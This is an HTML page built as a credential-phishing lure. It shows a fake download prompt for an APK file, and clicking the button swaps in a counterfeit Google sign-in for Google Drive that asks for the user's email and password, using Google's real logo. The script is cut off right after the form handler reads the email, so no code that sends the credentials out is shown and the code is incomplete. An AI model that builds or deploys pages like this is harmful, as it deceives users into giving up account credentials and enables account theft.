<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download File</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 400px;
        }

        .file-info {
            margin-bottom: 20px;
        }

        .file-info img {
            width: 80px;
            margin-bottom: 10px;
        }

        .file-name {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .file-size {
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }

        .download-btn {
            display: inline-block;
            padding: 12px 20px;
            background-color: #1a73e8;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .download-btn:hover {
            background-color: #185abc;
        }

        .login-container {
            text-align: center;
            background: white;
            padding: 40px 30px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 360px;
        }

        .google-logo {
            margin-bottom: 20px;
        }

        h2 {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
        }

        p {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 30px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #185abc;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #5f6368;
        }

        .footer a {
            color: #1a73e8;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        @media screen and (max-width: 400px) {
            .container, .login-container {
                width: 90%;
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Downloader Page -->
    <div class="container" id="downloadPage">
        <div class="file-info">
            <img src="https://via.placeholder.com/80" alt="File Icon">
            <div class="file-name">example_file.apk</div>
            <div class="file-size">Size: 25 MB</div>
        </div>
        <a class="download-btn" id="downloadBtn" href="#">Download</a>
    </div>

    <!-- Login Page -->
    <div class="login-container" id="loginPage" style="display: none;">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo" width="120">
        <h2>Sign in</h2>
        <p>to continue to Google Drive</p>
        <form id="loginForm">
            <input type="email" id="email" name="email" placeholder="Email or phone" required>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>
            <button type="submit">Next</button>
        </form>
        <div class="footer">
            <p>Not your computer? Use a private browsing window to sign in. <a href="#">Learn more</a></p>
        </div>
    </div>

    <script>
        const downloadBtn = document.getElementById('downloadBtn');
        const downloadPage = document.getElementById('downloadPage');
        const loginPage = document.getElementById('loginPage');

        downloadBtn.addEventListener('click', function(event) {
            event.preventDefault();
            downloadPage.style.display = 'none';
            loginPage.style.display = 'block';
        });

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;

</body>
</html>
